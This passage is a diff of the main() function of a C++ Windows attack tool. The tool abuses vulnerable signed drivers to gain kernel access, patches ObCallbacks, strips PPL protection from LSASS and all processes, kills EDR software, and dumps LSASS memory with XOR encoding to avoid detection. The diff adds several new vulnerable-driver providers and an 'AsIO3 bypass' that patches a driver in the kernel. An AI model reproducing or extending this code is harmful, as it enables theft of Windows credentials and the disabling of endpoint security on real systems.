         "  --xor-key HEX          XOR key byte in hex (default: 55); applies to --dump and --decode\n"
         "  --decode --in P --out P  undo XOR, validate MDMP\n\n"
+        "AsIO3 bypass:\n"
+        "  --patch-driver PATH    secondary driver used to patch AsIO3 IRP_MJ_CREATE in kernel\n"
+        "  --patch-driver-type T  iocdrv | asusbiosio | asmio | biostool (default: iocdrv)\n\n"
         "Cleanup:\n"
         "  --cleanup-only         force-unload driver and delete artifacts, then exit\n\n"
         "Common:\n"
@@ -1864,6 +3088,11 @@ int main(int argc, char** argv) {
             if (t == "biostool")               cfg.type = ProviderType::BiosTool;
             else if (t == "ktapi")             cfg.type = ProviderType::Ktapi;
             else if (t == "pdfwkrnl")          cfg.type = ProviderType::PdfwKrnl;
+            else if (t == "iocdrv")            cfg.type = ProviderType::IocDrv;
+            else if (t == "asio3")             cfg.type = ProviderType::AsIO3;
+            else if (t == "ntiolib")           cfg.type = ProviderType::NTIOLib;
+            else if (t == "rtsppx")            cfg.type = ProviderType::RtsPpx;
+            else if (t == "rwdrv")             cfg.type = ProviderType::RwDrv;
             else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
         }
         else if (a == "--dry-run")              cfg.dryRun           = true;
@@ -1890,6 +3119,8 @@ int main(int argc, char** argv) {
         else if (a == "--check-security")       cfg.doCheckSecurity  = true;
         else if (a == "--cleanup-only")         cfg.doCleanupOnly    = true;
         else if (a == "--force-unsafe")         cfg.forceUnsafe      = true;
+        else if (a == "--patch-driver")         cfg.patchDrvPath     = next();
+        else if (a == "--patch-driver-type")    cfg.patchDrvType     = next();
         else if (a == "--xor-key") {
 
             const char* kstr = next();
@@ -1901,12 +3132,11 @@ int main(int argc, char** argv) {
 
     if (cfg.verbose) g_verbose = true;
 
-    // Handle --check-security first (no driver needed)
     if (cfg.doCheckSecurity) {
         SecurityStatus sec = CheckSecurityFeatures();
         PrintSecurityStatus(sec);
         if (sec.hvciEnabled || sec.credGuardEnabled) {
-            return 1;  // Exit with error if dangerous features active
+            return 1;
         }
         return 0;
     }
@@ -1923,10 +3153,8 @@ int main(int argc, char** argv) {
     printf("[*] Windows build: %lu\n", build);
     SetOffsetsByBuild(build);
 
-    // Handle --cleanup-only: attempt to unload any leftover driver artifacts
     if (cfg.doCleanupOnly) {
         printf("[*] Cleanup-only mode: attempting to remove driver artifacts...\n");
-        // Try common service names
         const wchar_t* svcNames[] = {
             L"BiosToolCommonDriver", L"ktapi", L"PdFwKrnl",
             L"BiosTool_", nullptr  // prefix for pid-based names
@@ -1944,7 +3172,6 @@ int main(int argc, char** argv) {
             }
             DeleteServiceKey(svc);
         }
-        // Clean temp dir
         wchar_t tempDir[MAX_PATH]{};
         GetTempPathW(MAX_PATH, tempDir);
         WIN32_FIND_DATAW fd;
@@ -1963,7 +3190,6 @@ int main(int argc, char** argv) {
         return 0;
     }
 
-    // Pre-flight security check for dangerous operations
     bool isDangerousOp = cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                          cfg.doDumpTcp || cfg.killEdr || cfg.doPatchCallbacks;
     if (isDangerousOp && !cfg.forceUnsafe) {
@@ -2012,7 +3238,6 @@ int main(int argc, char** argv) {
         ListProcs(kb.systemEproc);
     }
 
-    // Resolve LSASS PID for dump modes
     DWORD pid = cfg.targetPid;
     if (!pid && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                  cfg.doDumpTcp || cfg.dryRun)) {
@@ -2037,7 +3262,6 @@ int main(int argc, char** argv) {
     if (cfg.killEdr) {
         printf("[*] Patching ObCallbacks before EDR kill...\n");
         PatchObCallbacks(kb.ntosBase);
-        // Walk EPROCESS list for PPL processes and strip all
         printf("[*] Stripping PPL from all running processes...\n");
         QWORD head  = kb.systemEproc + g_off.ActiveProcessLinks;
         QWORD flink = KReadQword(head);
@@ -2092,7 +3316,6 @@ int main(int argc, char** argv) {
         if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
         printf("[*] Auto-patching ObCallbacks for dump...\n");
         PatchObCallbacks(kb.ntosBase);
-        // Read current protection state before clearing
         QWORD lsassEp = FindEprocessByPid(kb.systemEproc, pid, nullptr);
         BYTE savedProt = 0, savedSig = 0, savedSecSig = 0;
         if (lsassEp) {
@@ -2103,7 +3326,6 @@ int main(int argc, char** argv) {
         PplResult r = StripPpl(kb.systemEproc, pid, false, true);
         if (!r.ok) { CleanupProvider(); return 1; }
         bool ok = DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor, cfg.xorKey);
-        // Restore protection
         if (lsassEp && savedProt) RestorePpl(lsassEp, savedProt, savedSig, savedSecSig);
         if (!ok) ret = 1;
     }
